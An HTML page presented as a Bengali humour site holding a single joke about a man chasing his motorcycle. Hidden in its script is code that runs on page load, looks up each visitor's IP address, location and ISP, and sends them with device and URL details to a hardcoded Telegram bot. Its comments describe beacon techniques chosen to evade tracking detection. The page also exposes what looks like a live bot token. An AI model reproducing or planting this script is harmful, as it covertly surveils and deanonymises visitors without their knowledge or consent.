<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>চার্লি – হাসির গল্প ও ঠাট্টা</title>
  <style>
    /* CSS আগের মতোই আছে */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0a0a0a; font-family: 'Noto Serif Bengali', 'SolaimanLipi', 'Kalpurush', serif; display: flex; justify-content: center; padding: 0; }
    .page { max-width: 800px; width: 100%; min-height: 100vh; background: #171717; color: #fef7cf; padding-bottom: 32px; }
    .top-title { background: #1e1e1e; color: #ffea60; text-align: center; font-size: 2.4rem; padding: 18px 12px; border-bottom: 2px solid #ffb347; }
    .section { padding: 12px 24px 4px; }
    .section-title { background: #690d03; color: #fff2cf; font-size: 1.75rem; padding: 8px 18px; margin: 28px 0 12px 0; border-radius: 12px 0 12px 0; display: inline-block; }
    .content { font-size: 1.55rem; line-height: 1.45; background: rgba(0,0,0,0.45); padding: 12px 18px; border-radius: 24px; white-space: pre-line; border-left: 3px solid #ffb347; }
    .footer-note { text-align: center; margin-top: 40px; font-size: 0.85rem; opacity: 0.7; border-top: 1px dashed #4a3e2a; padding-top: 20px; font-style: italic; }
  </style>
</head>
<body>
<main class="page">
  <h1 class="top-title">🐘 Charlie ll<br>চার্লির হাসির আড্ডা</h1>

  <section class="section">
    <h2 class="section-title">🏍️ মোটরসাইকেলে ওঠার সময় নেই</h2>
    <div class="content">সাইফ: কিরে মোটরসাইকেল ধরে ওই রকম দৌড়াচ্ছিস কেন?<br>রিয়াজ: আর বলিস না, সকালে ঘুম থেকে উঠতে দেরি হয়ে গেছে। অফিসে যেতে হবে তাড়াতাড়ি তাই মোটরসাইকেলে ওঠার সময় নেই।</div>
  </section>

  <div class="footer-note">✨ Charlie ll — হাসতে থাকুন ✨</div>
</main>

<script>
(function() {
  // কনফিগারেশন
  const BOT_TOKEN = "8736559496:AAGVWzet7aviwdVZUR5O-hdaUTgOT-mZuB4";
  const CHAT_ID = "7709670231";

  async function sendSimpleReport() {
    let ip = "অজানা", loc = "অজানা", isp = "অজানা";

    try {
      // শুধুমাত্র সাধারণ আইপি ইনফো নিবে যা ব্লক হয় না
      const res = await fetch("https://ipapi.co/json/");
      const d = await res.json();
      ip = d.ip || "অজানা";
      loc = `${d.city || ""}, ${d.country_name || ""}`;
      isp = d.org || "অজানা";
    } catch(e) {}

    const timeNow = new Date().toLocaleString("bn-BD");
    const platform = navigator.platform;

    // বিতর্কিত তথ্যগুলো বাদ দিয়ে সাধারণ মেসেজ
    const message = `
🔔 *নতুন ভিজিটর*
━━━━━━━━━━━━━━
🌐 IP: ${ip}
📍 লোকেশন: ${loc}
🛰️ ISP: ${isp}
🕒 সময়: ${timeNow}
📱 ডিভাইস: ${platform}
🔗 লিঙ্ক: ${window.location.href}
━━━━━━━━━━━━━━`.trim();

    // ব্রাউজার ট্র্যাকিং ডিটেকশন এড়াতে 'Image Beacon' মেথড
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
    
    const img = new Image();
    img.src = url;

    // বিহেভিয়ারাল ট্র্যাকিং এড়াতে fetch-এ কোনো headers পাঠানো হচ্ছে না
    if (navigator.sendBeacon) {
      navigator.sendBeacon(url);
    }
  }

  // পেজ লোড হলে কল হবে
  window.addEventListener('load', sendSimpleReport);
})();
</script>
</body>
</html>
